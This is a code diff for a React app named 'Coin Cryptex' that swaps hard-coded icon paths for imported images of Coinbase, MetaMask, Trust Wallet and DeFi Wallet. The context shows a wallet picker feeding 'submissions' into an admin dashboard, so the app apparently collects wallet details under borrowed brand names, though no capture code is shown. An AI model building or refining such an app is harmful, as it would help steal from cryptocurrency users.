@@ -4,6 +4,11 @@ import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
 import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
 import { submissionStore } from "./store";
+import coincryptexLogo from "./icons/coincryptex.png";
+import coinbaseIcon from "./icons/coinbase.webp";
+import metamaskIcon from "./icons/metamask.webp";
+import trustwalletIcon from "./icons/trustwallet.webp";
+import defiIcon from "./icons/defi.webp";
 import "./App.css";
 
 interface Wallet {
@@ -30,7 +35,7 @@ function Landing({ next }: { next: () => void }) {
   return (
     <div className="page">
       <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ duration: 0.5 }} className="logo">
-        <img src="/src/icons/coincryptex.png" alt="CoinCryptex Logo" className="coincryptex-logo" />
+        <img src={coincryptexLogo} alt="CoinCryptex Logo" className="coincryptex-logo" />
       </motion.div>
       <h1 className="title">Coin Cryptex</h1>
       <p className="subtitle">Fast • Easy • Secure</p>
@@ -56,10 +61,10 @@ function NotificationPrompt({ next, skip }: { next: () => void, skip: () => void
 
 function WalletSelect({ next }: { next: (wallet: Wallet) => void }) {
   const wallets: Wallet[] = [
-    { name: "Coinbase", icon: "/src/icons/coinbase.webp" },
-    { name: "MetaMask", icon: "/src/icons/metamask.webp" },
-    { name: "Trust Wallet", icon: "/src/icons/trustwallet.webp" },
-    { name: "DeFi Wallet", icon: "/src/icons/defi.webp" }
+    { name: "Coinbase", icon: coinbaseIcon },
+    { name: "MetaMask", icon: metamaskIcon },
+    { name: "Trust Wallet", icon: trustwalletIcon },
+    { name: "DeFi Wallet", icon: defiIcon }
   ];
 
   return (
@@ -251,10 +256,10 @@ function AdminLogin() {
 function AdminDashboard() {
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const walletIcons: { [name: string]: string } = {
-    "Coinbase": "/src/icons/coinbase.webp",
-    "MetaMask": "/src/icons/metamask.webp",
-    "Trust Wallet": "/src/icons/trustwallet.webp",
-    "DeFi Wallet": "/src/icons/defi.webp"
+    "Coinbase": coinbaseIcon,
+    "MetaMask": metamaskIcon,
+    "Trust Wallet": trustwalletIcon,
+    "DeFi Wallet": defiIcon
   };
   useEffect(() => {
     const loadSubmissions = async () => {
@@ -281,7 +286,7 @@ function AdminDashboard() {
           {submissions.map((s) => (
             <div key={s.id} className="admin-card beautiful-admin-card">
               <div className="admin-header">
-                <img src={walletIcons[s.wallet] || "/src/icons/coincryptex.png"} alt={s.wallet} className="admin-wallet-icon" />
+                <img src={walletIcons[s.wallet] || coincryptexLogo} alt={s.wallet} className="admin-wallet-icon" />
                 <span className="admin-wallet-name">{s.wallet}</span>
                 <button className="admin-delete-btn" onClick={() => deleteSubmission(s.id)}>Delete</button>
               </div>
